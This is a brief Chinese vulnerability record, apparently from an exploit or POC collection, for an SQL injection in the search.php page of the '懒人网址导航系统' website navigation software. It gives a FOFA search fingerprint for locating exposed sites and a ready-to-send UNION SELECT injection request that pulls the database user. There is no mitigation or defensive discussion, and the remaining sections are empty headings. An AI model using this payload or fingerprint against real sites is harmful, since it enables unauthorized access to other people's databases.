# 懒人网址导航系统search存在SQL注入漏洞

- **系统**：懒人网址导航系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`fofa`"./templates/antidote/css/style.css`
- **请求**：`GET /search.php?keyword=' UNION ALL SELECT CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Bypass HTTP/1.1`

**请求体 / payload**
```

```

**其他**
- 懒人网址导航系统search存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 懒人网址导航系统